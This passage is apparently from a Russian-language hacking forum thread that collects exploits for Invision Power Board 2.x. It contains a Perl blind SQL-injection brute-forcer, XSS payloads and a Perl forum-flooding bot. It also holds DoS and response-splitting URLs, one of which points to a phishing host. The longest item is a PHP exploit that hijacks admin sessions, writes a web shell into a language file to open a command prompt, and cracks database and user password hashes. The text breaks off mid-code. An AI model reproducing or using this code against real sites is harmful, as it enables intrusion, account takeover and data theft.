&#40;&#40;$fmax-$fmin&#41;&lt;5&#41; &#123; $i=crack&#40;$fmin,$fmax&#41;; return $i; &#125; $r = int&#40;$fmax - &#40;$fmax-$fmin&#41;/2&#41;; $check = &quot; BETWEEN $r AND $fmax&quot;; if &#40; &amp;check&#40;$check&#41; &#41; &#123; &amp;found&#40;$r,$fmax&#41;; &#125; else &#123; &amp;found&#40;$fmin,$r&#41;; &#125; &#125; sub crack&#40;$$&#41; &#123; my $cmin = $_&#91;0&#93;; my $cmax = $_&#91;1&#93;; $i = $cmin; while &#40;$i&lt;$cmax&#41; &#123; $crcheck = &quot;=$i&quot;; if &#40; &amp;check&#40;$crcheck&#41; &#41; &#123; return $i; &#125; $i++; &#125; $i = 0; return $i; &#125; sub check&#40;$&#41; &#123; $n++; $rep = ''; $ccheck = $_&#91;0&#93;; $xpl = LWP::UserAgent-&gt;new&#40; &#41; or die; $res = $xpl-&gt;get&#40;$url.'?autocom=arcade',cookie=&gt;'g_display_sort=added;g_display_order=,&#40;-gid*&#40;SELECT 1 FROM '.$prefix.'members WHERE &#40;id='.$user_id.' AND ascii&#40;substring&#40;'.$column.','.$s_num.',1&#41;&#41;'.$cchec k.'&#41; LIMIT 1&#41;&#41; LIMIT 1'&#41;; if&#40;$res-&gt;as_string =~ /g=&#40;d+&#41;&quot; target=&quot;hiddenframe&quot;&gt;&lt;img src=&quot;./arcade/images/addfav.gif&quot;/&#41; &#123; $rep = $1; &#125; if&#40;$rep == $true&#41; &#123; return 1; &#125; else &#123; return 0; &#125; &#125; sub report&#40;&#41; &#123; $InfoWindow=$mw-&gt;DialogBox&#40;-title =&gt; 'Report', -buttons =&gt; &#91;&quot;OK&quot;&#93;&#41;; $InfoWindow-&gt;add&#40;'Label', -text =&gt; $_&#91;0&#93;, -font =&gt; '&#123;Verdana&#125; 7'&#41;-&gt;pack; $InfoWindow-&gt;Show&#40;&#41;; $InfoWindow-&gt;destroy; &#125; ||Invision Power Board &lt;=v2.3.4 BBCodes XSS||Код: |Выделить всё|...................... $match&#91; $_content &#93;&#91;$i&#93; = preg_replace&#40; '#&#40;style&#41;=#is', &quot;$1=&quot;, $match&#91; $_content &#93;&#91;$i&#93; &#41;; $match&#91; $_option &#93;&#91;$i&#93; = preg_replace&#40; '#&#40;style&#41;=#is', &quot;$1=&quot;, $match&#91; $_option &#93;&#91;$i&#93; &#41;; ....................... //----------------------------------------- // Don't let emos in URL.. //----------------------------------------- if &#40; $this-&gt;parse_smilies &#41; &#123; if &#40; count&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; &#41; &gt; 0 &#41; &#123; foreach&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; as $row&#41; &#123; $code = $row&#91;'typed'&#93;; $code = str_replace&#40; '&lt;', '&amp;lt;', str_replace&#40; '&gt;', '&amp;gt;', $code &#41; &#41;; if&#40; strpos&#40; $url, $code &#41; &#41; &#123; $new = ''; for&#40; $i=0; $i&lt;strlen&#40;$code&#41;; $i++ &#41; &#123; //print dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;.'&lt;Br&gt;'; $new .= '%' . dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;; &#125; $url = str_replace&#40; $code, $new, $url &#41;; &#125; &#125; // Using the :/ smiley $url = str_replace&#40; 'http%3a%2f', 'http:/', $url &#41;; &#125; &#125; $url = htmlspecialchars&#40;$url&#41;; ....................... //----------------------------------------- // Don't let emos in URL.. //----------------------------------------- if &#40; $this-&gt;parse_smilies &#41; &#123; if &#40; count&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; &#41; &gt; 0 &#41; &#123; foreach&#40; $this-&gt;ipsclass-&gt;cache&#91;'emoticons'&#93; as $row&#41; &#123; $code = $row&#91;'typed'&#93;; $code = str_replace&#40; '&lt;', '&amp;lt;', str_replace&#40; '&gt;', '&amp;gt;', $code &#41; &#41;; if&#40; strpos&#40; $url&#91;'html'&#93;, $code &#41; &#41; &#123; $new = ''; for&#40; $i=0; $i&lt;strlen&#40;$code&#41;; $i++ &#41; &#123; //print dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;.'&lt;Br&gt;'; $new .= '%' . dechex&#40;ord&#40;$code&#123;$i&#125;&#41;&#41;; &#125; $url&#91;'html'&#93; = str_replace&#40; $code, $new, $url&#91;'html'&#93; &#41;; &#125; &#125; // Using the :/ smiley $url&#91;'html'&#93; = str_replace&#40; 'http%3a%2f', 'http:/', $url&#91;'html'&#93; &#41;; &#125; &#125; $url&#91;'html'&#93; = htmlspecialchars&#40; $url&#91;'html'&#93; &#41;; ...................... |Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||Lenar|&raquo; 13 июн 2008 21:18 ||Invision Power Board &lt;=2.3.5 Active XSS|Работает в ie Не работает в opera 1) создаем файл any.html внути него &lt;script&gt;alert()&lt;/script&gt; 2) содаем пост с аттачем any.html|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||Lenar|&raquo; 08 авг 2008 16:38 ||IPB Forum Flood|[php]#---------------------------- # this programe has been # # created by NikTrix-Souvico # # [ 'HellSoft' ] for # # Flooding IPB Forums # #---------------------------- #!/usr/bin/perl -w use strict; use LWP::UserAgent; use HTTP::Cookies; #Variables my $url = undef; my $login = undef; my $UserName = undef; my $PassWord = undef; my $CookieDate = 1; my $SID = undef; my $SE = undef; my $MSG = undef; #Prototype sub IPBFlood($); #Main print &quot;\t\tWelcome to IPBFlood 0.1x By Souvik\t\t[ 'NikTrix' ]Team&quot;; print &quot;Url\t: &quot;;chomp($url=); print &quot;UserName\t: &quot;;chomp($UserName=); print &quot;Password\t: &quot;;chomp($PassWord=); print &quot;Start [to] End\t: &quot;;chomp($SE=); print &quot;Message\t: &quot;;chomp($MSG=); my $ua = LWP::UserAgent-&gt;new; $ua-&gt;agent(&quot;Mozilla/4.0&quot;); my $cj = HTTP::Cookies-&gt;new(file =&gt; &quot;N/A&quot; , autosave =&gt; 0); $ua-&gt;cookie_jar($cj); #-get SID my $r = $ua-&gt;get($url); if($r-&gt;is_success){ #Find SID ? ($SID) = $r-&gt;content =~/\?s=(\w{32})&amp;.*/i; print &quot;SID : $SID&quot;; } #-Connecting ... $r = $ua-&gt;post($url.$login,[UserName=&gt; $UserName ,PassWord =&gt; $PassWord ,CookieDate =&gt;$CookieDate , s =&gt; $SID]); if($r-&gt;is_success){ print &quot;[+] Connected&quot; if($r-&gt;content =~ /cliquez ici si vous ne souhaitez pas/gi); my($Start , $End) = split(/-/,$SE); foreach($Start..$End){ IPBFlood($_); } } #Subroutines sub IPBFlood($){ my $Topic = shift; my $get = $ua-&gt;get($url.&quot;s=$SID&amp;showtopic=$Topic&quot;); if($get-&gt;is_success){ #Get Subforum ID &quot;f&quot; : variable ! if( my ($f) = $get-&gt;content =~/f=(\d{1,4})/ ){ print &quot;[-]Subforum ID : $f &amp; Topic N : $Topic&quot;; #Get Post AuthKey for Subforum f=N° $get = $ua-&gt;get($url.&quot;s=$SID&amp;act=post&amp;do=reply_post&amp;f=$f&amp;t=$Topic&quot;); # act=post&amp;do=reply_post&amp;f=56&amp;t=43988 if($get-&gt;is_success){ ##auth_key Ex : my ( $auth_key ) = $get-&gt;content =~/auth_key.*(\w{32})/i; #attach_post_key Ex : my ( $attach_post_key ) = $get-&gt;content =~/attach_post_key.*(\w{32})/i; print &quot;[-]auth_key : $auth_key[-]attach_post_key : $attach_post_key&quot;; my %form =(st =&gt; 0, act =&gt; &quot;Post&quot;, s =&gt; &quot;$SID&quot;, f =&gt; &quot;$f&quot;, auth_key =&gt; &quot;$auth_key&quot;, removeattachid =&gt; &quot;0&quot;, CODE =&gt; &quot;03&quot;, t =&gt; &quot;$Topic&quot;, attach_post_key =&gt; &quot;$attach_post_key&quot;, parent_id =&gt; &quot;0&quot;, &quot;ed-0_wysiwyg_used&quot;=&gt; &quot;0&quot;, &quot;editor_ids%5B%5D&quot; =&gt; &quot;ed-0&quot;, Post =&gt; &quot;$MSG&quot;, enableemo =&gt; &quot;yes&quot;, enablesig =&gt; &quot;yes&quot;, iconid =&gt; &quot;0&quot; ); $r = $ua-&gt;post($url.&quot;s=$SID&quot;,\%form); if($r-&gt;is_success){ print &quot;Send success !&quot; if( length($r-&gt;content)&lt; 300); } } } } }[/php]|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||Lenar|&raquo; 02 сен 2008 20:11 ||1) Отказ в обслуживании|Неправильное использование пост-инкремента в защитной функции разбора массивов. Сервер будет рекурсивно обрабатывать не первые 10 подмассивов, а все. |/index.php?foo[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]=123|соответственно чем больше скобок, тем дольше будет обработка |2) HTTP Response Splitting attacks|INFO[base_url] не определен в конфиге |/admin.php?INFO[base_url]=http://phishing-hax.com/||Invision Power Board &lt;= 2.3.5 Multiple Vulnerabilities|Экспоит основывается на SQL-inj в параметре &quot;name&quot; файла &quot;sources/action_public/xmlout.php&quot; и использует технологию классического посимвольного брута данных. Особенность урленкода %2527 делает его независимым от magic_quotes. /ipb235/index.php?s=&amp;act=xmlout&amp;do=check-display-name&amp;name=%2527 В эксплоите предусмотрено три режима работы. -attack 1 Через скуль получают сессию админа. Из настроек извлекается инфа о привязке сессии к ip-address и browser. Если таковая привязка имеется (включено по дефолту) и админ заходил не из под прокси - атака невозможна. В ином случае - извлекаются ip-address и browser админа и производится попытка войти под админом. В случае успешной попытки эксплоит прописывает веб-шелл в файл языка. Вероятность успеха атаки мала, ибо: ~ сессия имет по дефолту привязку к айпи и браузеру ~ время жизни сессии скорее всего просрочено. придется караулить админа, либо спровоцировать его зайти в админку. Сам процесс &quot;ожидания&quot; в эксплоите реализован в цикле - ожидание появления новой сессии. Пример запуска эксплойта: |php ipb235-multi.txt -attack 1 -url |http://www.ipb-235.com/forum/|-attack 2 Как ни удивительно - в сессии cookie *ipb_stronghold пользователя присутствует пароль к БД. Используя атаку по словарю, эксплоит пытается сбрутить пароль к БД из хеша сессии. Через скуль эксплоит получает имя текущего пользователя БД. Необходима валидная учетная запись, либо куки со сниффера. Вероятность успеха мала и зависит в большей мере от вашего словаря и рэндомности пароля.|Спорьте, заблуждайтесь, ошибайтесь, но, ради бога, размышляйте, и хотя криво, да сами. |Серьезное лицо - еще не признак ума, господа. Вы улыбайтесь, господа, улыбайтесь!||Lenar||Местный Босс|Откуда:|Казань|Сообщения:|11725|Медали:|12|Skype||Вернуться к началу||divir|&raquo; 03 сен 2008 15:05 ||Сам эксплойт ipb235 multi в дополнение:||Код: |Выделить всё|#!/usr/bin/php -q &lt;?php error_reporting&#40;E_ALL ^ E_NOTICE&#41;; # yeah ... it rox &#40;: class ipb_spl &#123; var $web; function main&#40;&#41; &#123; $this-&gt;mhead&#40;&#41;; # Gimme your args $this-&gt;p_attack = $this-&gt;get_p&#40;'attack', true&#41;; $this-&gt;p_prox = $this-&gt;get_p&#40;'proxhost'&#41;; $this-&gt;p_proxa = $this-&gt;get_p&#40;'proxauth'&#41;; $this-&gt;init_global&#40;&#41;; # Proxy params if&#40; $this-&gt;p_prox &#41; &#123; $this-&gt;web-&gt;proxy&#40;$this-&gt;p_prox&#41;; if&#40; $this-&gt;p_proxa &#41; $this-&gt;web-&gt;proxyauth&#40;$this-&gt;p_proxa&#41;; &#125; # Where do we go ? switch&#40; $this-&gt;p_attack &#41; &#123; case 1: $this-&gt;code_exec&#40;&#41;; break; case 2: $this-&gt;bf_sql_pwd&#40;&#41;; break; case 3: $this-&gt;bf_usr_pwd&#40;&#41;; break; default: $this-&gt;usage&#40;&#41;; &#125; return; &#125; function code_exec&#40;$loop=1&#41; &#123; # First loop if&#40; $loop == 1 &#41; &#123; $this-&gt;set_sql_param&#40;&#41;; $this-&gt;set_sql_focus&#40;&#41;; $this-&gt;p_acp = $this-&gt;get_p&#40;'acp'&#41;; # ACP path if&#40; !$this-&gt;p_acp &#41; &#123; # If the user changed the ACP directory, we can # find it &#40;if the &quot;Remove ACP Link&quot; option was not # applied&#41; by log in as an Admin, and then click # on &quot;Admin CP&quot;. This can be done with a user # but I didn't implemented that ;&#41; $this-&gt;msg&#40;'Using default ACP path: admin', 1&#41;; $this-&gt;p_acp = 'admin'; &#125; else $this-&gt;msg&#40;'Using ACP path &quot;'.$this-&gt;p_acp.'&quot;', 1&#41;; # Init client headers: # Only if we have the same IP as the targeted user &#40;not admin&#41;, # it resets session datas, so we try to spoof our # IP as a random one in order to keep user's session datas while # we bruteforce SQL fields. $this-&gt;bypass_matches&#40;&#41;; # Remove expired sessions &#40; time&#40;&#41; - 60*60*2 = &gt; 2 hours &#41; $this-&gt;web-&gt;get&#40;$this-&gt;p_url.$this-&gt;p_acp.'/index.php?'&#41;; $this-&gt;msg&#40;'Removed all out of date admin sessions', 1&#41;; # Cookie prefix $this-&gt;get_cprefix&#40;&#41;; &#125; # Admin session ? $this-&gt;msg&#40;'Trying to find an admin session id', 0&#41;; # Got one :&#93; if&#40; $this-&gt;get_admin_sess&#40;&#41; &#41; &#123; $this-&gt;s_admin = true; $this-&gt;s_sess = $this-&gt;data&#91;'a_sess_id'&#93;; $this-&gt;a_url = $this-&gt;p_url.$this-&gt;p_acp.'/index.php?adsess='.$this-&gt;s_sess; &#125; # Nothing special else &#123; $this-&gt;s_admin = false; $this-&gt;msg&#40;'No admin session id found', -1&#41;; &#125; # User session ? if&#40; !$this-&gt;s_sess &#41; &#123; $this-&gt;msg&#40;'Trying to find a user session id', 0&#41;; # Yep if&#40; $this-&gt;get_user_sess&#40;&#41; &#41; $this-&gt;s_sess = $this-&gt;data&#91;'u_sess_id'&#93;; # F0ck else &#123; $this-&gt;msg&#40;'No user session id found', -1&#41;; $this-&gt;msg&#40;'Admin session &gt; 2 hours or user logged out', 0&#41;; $this-&gt;msg&#40;'Keeping trying until the user connects', 0&#41;; $this-&gt;msg&#40;'Entering loop #'.$loop.' ...', 0&#41;; $this-&gt;code_exec&#40;++$loop&#41;; &#125; &#125; $this-&gt;msg&#40;'Getting security options', 0&#41;; # Security options $this-&gt;get_sec_options&#40;&#41;; # IP filter ? if&#40; $this-&gt;conf&#91;'ip'&#93; === '1' &#41; &#123; $this-&gt;s_bypass = true; $this-&gt;msg&#40;'IP filter option is turned on', 0&#41;; # Spoofing protection ? if&#40; !$this-&gt;conf&#91;'xforward'&#93; &#41; &#123; # Assuming our IP isn't the same etc.. $this-&gt;msg&#40;'Can\'t bypass the IP filter', -1&#41;; exit&#40;1&#41;; &#125; # X-Forwarded-For / Client-IP / # Proxy-User / X-Cluster-Client-IP else &#123; $this-&gt;msg&#40;'Cool, we can spoof our IP &#40;Client-IP&#41;', 1&#41;; if&#40; $this-&gt;s_admin &#41; &#123; $this-&gt;msg&#40;'Trying to find admin\'s last IP', 0&#41;; # Admin IP found $this-&gt;get_admin_ip&#40;&#41;; $this-&gt;s_ip = $this-&gt;data&#91;'a_ip_addr'&#93;; &#125; else &#123; $this-&gt;s_admin = false; $this-&gt;msg&#40;'Trying to find user\'s last used IP', 0&#41;; # User IP found $this-&gt;get_user_ip&#40;&#41;; $this-&gt;s_ip = $this-&gt;data&#91;'u_ip_addr'&#93;; &#125; # Nothing found if&#40; !$this-&gt;s_ip &#41; &#123; # Ahah &#40;: $this-&gt;msg&#40;'No IP found for this user', -1&#41;; $this-&gt;give_hope&#40;&#41;; &#125; # Got one ! else $this-&gt;msg&#40;'Ok, using IP '.$this-&gt;s_ip, 1&#41;; &#125; &#125; # User-Agent filter ? if&#40; $this-&gt;conf&#91;'browser'&#93; === '1' &amp;&amp; !$this-&gt;s_admin &#41; &#123; $this-&gt;s_bypass = true; $this-&gt;msg&#40;'Trying to find a valid user-agent', 0&#41;; # Good if&#40; $this-&gt;get_user_agent&#40;&#41; &#41; &#123; $this-&gt;msg&#40;'Ok, using user-agent '.substr&#40;$this-&gt;data&#91;'u_agent'&#93;, 0, 10&#41;.'...', 1&#41;; $this-&gt;s_agent = $this-&gt;data&#91;'u_agent'&#93;; &#125; # WTF :! else &#123; $this-&gt;msg&#40;'No user-agent found for this user', -1&#41;; $this-&gt;msg&#40;'Maybe the browser didn\'t send this header', 0&#41;; $this-&gt;s_agent = ''; &#125; &#125; # Cool !? if&#40; !$this-&gt;s_bypass &#41; $this-&gt;msg&#40;'Cool, nothing to bypass', 1&#41;; $this-&gt;msg&#40;'Trying to log in', 0&#41;; # Owned =&#93; if&#40; $this-&gt;is_logged&#40;&#41; &#41; &#123; # PHP code if&#40; $this-&gt;s_admin &#41; &#123; $this-&gt;msg&#40;'Logged in with an admin session', 1&#41;; $this-&gt;exec_code&#40;&#41;; &#125; # Normal user ? else &#123; $this-&gt;msg&#40;'Logged in with a user session', 1&#41;; $this-&gt;msg&#40;'You can log in using the cookie session_id', 1&#41;; if&#40; $this-&gt;s_ip !== $this-&gt;def_ip &#41; $this-&gt;msg&#40;'Set the Client-IP header to: '.$this-&gt;s_ip, 1&#41;; if&#40; $this-&gt;s_agent &#41; $this-&gt;msg&#40;'Set the User-Agent header to: '.$this-&gt;s_agent, 1&#41;; exit&#40;0&#41;; &#125; &#125; else &#123; # Even if the admin logged out .. the admin session # is still valid ;&#41; $this-&gt;msg&#40;'Can\'t log in, the session has expired ?!', -1&#41;; $this-&gt;give_hope&#40;&#41;; &#125; return; &#125; function bf_sql_pwd&#40;&#41; &#123; $this-&gt;p_ip = $this-&gt;get_p&#40;'ip', true&#41;; $this-&gt;p_dict = $this-&gt;get_p&#40;'dict', true&#41;; $this-&gt;p_sql_u = $this-&gt;get_p&#40;'sqlusr'&#41;; $this-&gt;p_url = $this-&gt;get_p&#40;'url'&#41;; $this-&gt;p_uname = $this-&gt;get_p&#40;'uname'&#41;; $this-&gt;p_pwd = $this-&gt;get_p&#40;'pwd'&#41;; // or $this-&gt;p_uid = $this-&gt;get_p&#40;'uid'&#41;; $this-&gt;p_hash = $this-&gt;get_p&#40;'passhash'&#41;; $this-&gt;p_shold = $this-&gt;get_p&#40;'stronghold'&#41;; if&#40; $this-&gt;p_uname &amp;&amp; $this-&gt;p_pwd &amp;&amp; $this-&gt;p_url &#41; &#123; $this-&gt;get_cprefix&#40;&#41;; $this-&gt;msg&#40;'Trying to get some cookies', 0&#41;; $g_dat = 'index.php?act=Login&amp;CODE=01&amp;CookieDate=1'; $p_dat = 'UserName='.$this-&gt;p_uname.'&amp;PassWord='.$this-&gt;p_pwd.'&amp;x=0&amp;y=0'; $this-&gt;web-&gt;post&#40;$this-&gt;p_url.$g_dat, $p_dat&#41;; $this-&gt;p_uid = $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'member_id'&#93;; $this-&gt;p_hash = $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'pass_hash'&#93;; $this-&gt;p_shold = $this-&gt;web-&gt;cookie&#91;$this-&gt;s_cprefix.'ipb_stronghold'&#93;; &#125; elseif&#40; !$this-&gt;p_uid |!$this-&gt;p_hash |!$this-&gt;p_shold &#41; $this-&gt;usage&#40;&#41;; if&#40; !$this-&gt;p_uid |!$this-&gt;p_hash |!$this-&gt;p_shold &#41; &#123; $this-&gt;msg&#40;'Can\'t get cookies', -1&#41;; $this-&gt;msg&#40;'You should try with other parameters', -1&#41;; exit&#40;1&#41;; &#125; $this-&gt;msg&#40;'Ok, using cookies:', 1&#41;; $this-&gt;msg&#40;'member_id='.$this-&gt;p_uid, 1&#41;; $this-&gt;msg&#40;'pass_hash='.$this-&gt;p_hash, 1&#41;; $this-&gt;msg&#40;'ipb_stronghold='.$this-&gt;p_shold, 1&#41;; if&#40; !$this-&gt;p_sql_u &#41; &#123; $this-&gt;set_sql_param&#40;&#41;; $this-&gt;msg&#40;'Trying to get the current sql user', 0&#41;; if&#40; !$this-&gt;get_sql_user&#40;&#41; &#41; &#123; $this-&gt;msg&#40;'Can\'t get the sql user', -1&#41;; $this-&gt;msg&#40;'If you know the sql user, use -sqlusr', -1&#41;; exit&#40;1&#41;; &#125; else $this-&gt;p_sql_u = $this-&gt;data&#91;'sql_user'&#93;; &#125; $this-&gt;msg&#40;'Ok, using sql user '.$this-&gt;p_sql_u, 1&#41;; $dico_c = file&#40;$this-&gt;p_dict&#41;; $ip_a = explode&#40;'.', $this-&gt;p_ip&#41;; $this-&gt;msg&#40;'Entering local dictionnary attack &#40;'.count&#40;$dico_c&#41;.' words&#41;', 0&#41;; $this-&gt;msg&#40;'You should take a drink ...', 0&#41;; foreach&#40; $dico_c as $line &#41; &#123; $md5 = md5&#40;trim&#40;$line&#41;.$this-&gt;p_sql_u&#41;; $md5 = md5&#40;$this-&gt;p_uid.'-'.$ip_a&#91;0&#93;.'-'.$ip_a&#91;1&#93;.'-'.$this-&gt;p_hash&#41;.$md5; $md5 = md5&#40;$md5&#41;; if&#40; $this-&gt;p_shold === $md5 &#41; &#123; $this-&gt;msg&#40;'Found something cool =&#93;', 1&#41;; $this-&gt;msg&#40;'SQL password: '.$line, 1&#41;; exit&#40;1&#41;; &#125; &#125; $this-&gt;msg&#40;'End of the wordlist, password not found', -1&#41;; return; &#125; function bf_usr_pwd&#40;&#41; &#123; $this-&gt;p_dict = $this-&gt;get_p&#40;'dict', true&#41;; $this-&gt;p_hash = $this-&gt;get_p&#40;'passhash'&#41;; $this-&gt;p_salt = $this-&gt;get_p&#40;'salt'&#41;; if&#40; !$this-&gt;p_hash |!$this-&gt;p_salt &#41; &#123; $this-&gt;set_sql_param&#40;&#41;; $this-&gt;set_sql_focus&#40;&#41;; &#125; if&#40; !$this-&gt;p_hash &#41; &#123; $this-&gt;msg&#40;'Trying to get the password hash', 0&#41;; if&#40; !$this-&gt;get_pass_hash&#40;&#41; &#41; &#123; $this-&gt;msg&#40;'Can\'t get the password hash', -1&#41;; exit&#40;1&#41;; &#125; else $this-&gt;p_hash = $this-&gt;data&#91;'pass_hash'&#93;; &#125; $this-&gt;msg&#40;'Ok, using hash '.$this-&gt;p_hash, 1&#41;; if&#40; !$this-&gt;p_salt &#41; &#123; $this-&gt;msg&#40;'Trying to get the password salt', 0&#41;; if&#40; !$this-&gt;get_pass_salt&#40;&#41; &#41; &#123; $this-&gt;msg&#40;'Can\'t get the password salt', -1&#41;; exit&#40;1&#41;; &#125; else $this-&gt;p_salt = $this-&gt;data&#91;'pass_salt'&#93;; &#125; $this-&gt;msg&#40;'Ok, using salt '.$this-&gt;p_salt, 1&#41;; $dico_c = file&#40;$this-&gt;p_dict&#41;; $this-&gt;msg&#40;'Entering local dictionnary attack &#40;'.count&#40;$dico_c&#41;.' words&#41;', 0&#41;; $this-&gt;msg&#40;'You should take a drink ...', 0&#41;; foreach&#40; $dico_c as $line &#41; &#123; if&#40; $this-&gt;p_hash === md5&#40;md5&#40;$this-&gt;p_salt&#41;.md5&#40;trim&#40;$line&#41;&#41;&#41; &#41; &#123; $this-&gt;msg&#40;'Found something cool =&#93;', 1&#41;; $this-&gt;msg&#40;'User password: '.$line, 1&#41;; exit&#40;1&#41;; &#125; &#125; $this-&gt;msg&#40;'End of the wordlist, password not found', -1&#41;; return; &#125; function set_sql_param&#40;&#41; &#123; $this-&gt;p_url = $this-&gt;get_p&#40;'url', true&#41;; $this-&gt;p_pre = $this-&gt;get_p&#40;'prefix'&#41;; # Table prefix if&#40; !$this-&gt;p_pre &#41; &#123; # Default table prefix if not precised $this-&gt;msg&#40;'Using default table prefix: ibf_', 1&#41;; $this-&gt;p_pre = 'ibf_'; &#125; else $this-&gt;msg&#40;'Using table prefix '.$this-&gt;p_pre, 1&#41;; &#125; function set_sql_focus&#40;&#41; &#123; $this-&gt;p_uname = $this-&gt;get_p&#40;'uname'&#41;; $this-&gt;p_uid = $this-&gt;get_p&#40;'uid'&#41;; if&#40; $this-&gt;p_uname &#41; $this-&gt;msg&#40;'Using targeted username '.$this-&gt;p_uname, 1&#41;; elseif&#40; $this-&gt;p_uid &#41; $this-&gt;msg&#40;'Using targeted user id '.$this-&gt;p_uid, 1&#41;; # Target if&#40; !&#40;$this-&gt;p_uname |$this-&gt;p_uid&#41; &#41; &#123; # Default uid if not precised $this-&gt;msg&#40;'Using default user id: 1', 1&#41;; $this-&gt;p_uid = 1; &#125; # Focus on ? if&#40; $this-&gt;p_uname &#41; $this-&gt;t_on = 'members_l_username=\''.addslashes&#40;$this-&gt;p_uname&#41;.'\''; else $this-&gt;t_on = 'id='.&#40;int&#41;$this-&gt;p_uid; return; &#125; function exec_code&#40;&#41; &#123; $this-&gt;write_code&#40;&#41;; while&#40; $this-&gt;cmd_prompt&#40;&#41; &#41; &#123; $this-&gt;web-&gt;addheader&#40;'My-Code', $this-&gt;cmd&#41;; $this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;; print &quot;\n&quot;.$this-&gt;get_answer&#40;&#41;; &#125; exit&#40;0&#41;; &#125; function get_answer&#40;&#41; &#123; $res_a = explode&#40;$this-&gt;res_sep, $this-&gt;web-&gt;getcontent&#40;&#41;&#41;; if&#40; !$res_a&#91;1&#93; &#41; return 'No result to retrieve'; else return $res_a&#91;1&#93;; &#125; function cmd_prompt&#40;&#41; &#123; $this-&gt;cmd = $this-&gt;msg&#40;'root@ipb: ', 1, 1, 0, true&#41;; if&#40; !ereg&#40;'^&#40;quit|exit&#41;$', $this-&gt;cmd&#41; &#41; &#123; $this-&gt;cmd = base64_encode&#40;$this-&gt;cmd&#41;; $this-&gt;cmd = str_replace&#40;'%CMD%', $this-&gt;cmd, $this-&gt;php_send&#41;; return TRUE; &#125; else return FALSE; &#125; function write_code&#40;&#41; &#123; # Gimme the language ID $this-&gt;get_def_lang&#40;&#41;; # Current lang settings $p_dat = 'code=edit2&amp;act=lang&amp;id='.$this-&gt;g_lid.'&amp;section'. '=lookandfeel&amp;lang_file=lang_boards.php'; $this-&gt;web-&gt;post&#40;$this-&gt;a_url, $p_dat&#41;; # We collect each variable name / value if&#40; preg_match_all&#40;$this-&gt;reg_lvar, $this-&gt;web-&gt;getcontent&#40;&#41;, $l_vars&#41; &#41; &#123; # POST data $p_dat = 'code=doedit&amp;act=lang&amp;id='.$this-&gt;g_lid. '&amp;lang_file=lang_boards.php&amp;section=lo'. 'okandfeel&amp;'; # &amp;Name=Value for&#40; $i=0; $i&lt;count&#40;$l_vars&#91;0&#93;&#41;; $i++ &#41; &#123; $p_dat .= '&amp;XX_'.$l_vars&#91;1&#93;&#91;$i&#93;.'='.urlencode&#40;$l_vars&#91;2&#93;&#91;$i&#93;&#41;; # We write our PHP code in the first variable if&#40; $i == 0 &#41; $p_dat .= $this-&gt;php_write; &#125; # Go on $this-&gt;web-&gt;post&#40;$this-&gt;a_url, $p_dat&#41;; $this-&gt;msg&#40;'PHP code written', 1&#41;; &#125; else &#123; # WTF :! $this-&gt;msg&#40;'Can\'t find block variables', 0&#41;; exit&#40;1&#41;; &#125; return; &#125; function get_def_lang&#40;&#41; &#123; $this-&gt;msg&#40;'Trying to get the set language id', 0&#41;; $this-&gt;web-&gt;get&#40;$this-&gt;a_url.'&amp;section=lookandfeel&amp;act=lang'&#41;; if&#40; preg_match&#40;$this-&gt;reg_lang, $this-&gt;web-&gt;getcontent&#40;&#41;, $lids&#41; &#41; &#123; $this-&gt;g_lid = $lids&#91;1&#93;; $this-&gt;msg&#40;'Using language id '.$this-&gt;g_lid, 1&#41;; &#125; else &#123; $this-&gt;msg&#40;'Can\'t get the default language id', -1&#41;; exit&#40;1&#41;; &#125; return; &#125; function is_logged&#40;&#41; &#123; $this-&gt;bypass_matches&#40;&#41;; # User session ok ? if&#40; !$this-&gt;s_admin &#41; &#123; $match = 'act=Login&amp;amp;CODE=03'; $this-&gt;web-&gt;addcookie&#40;$this-&gt;s_cprefix.'session_id', $this-&gt;s_sess&#41;; $this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;; &#125; # Admin session ok ? else &#123; $match = '&amp;section='; $this-&gt;web-&gt;get&#40;$this-&gt;a_url&#41;; &#125; if&#40; preg_match&#40;&quot;/$match/i&quot;, $this-&gt;web-&gt;getcontent&#40;&#41;&#41; &#41; return true; else return false; &#125; function bypass_matches&#40;&#41; &#123; # match_browser $this-&gt;web-&gt;agent&#40;$this-&gt;s_agent&#41;; # match_ipaddress $this-&gt;web-&gt;addheader&#40;'Client-IP', $this-&gt;s_ip&#41;; return; &#125; function get_cprefix&#40;&#41; &#123; $this-&gt;msg&#40;'Trying to get the cookie prefix', 0&#41;; # Set-Cookie: session_id=...; path=/ $this-&gt;web-&gt;get&#40;$this-&gt;p_url&#41;; $this-&gt;s_cprefix = ''; if&#40; $this-&gt;web-&gt;cookie &#41; &#123; foreach&#40; $this-&gt;web-&gt;cookie as $name =&gt; $value&#41; &#123; if&#40; preg_match&#40;$this-&gt;reg_cpre, $name, $cmatches&#41; &#41; &#123; $this-&gt;s_cprefix = $cmatches&#91;1&#93;; break; &#125; &#125; &#125; if&#40; !$this-&gt;s_cprefix &#41; $this-&gt;msg&#40;'No cookie prefix set', 1&#41;; else $this-&gt;msg&#40;'Using cookie prefix '.$this-&gt;s_cprefix, 1&#41;; return; &#125; function get_sec_options&#40;&#41; 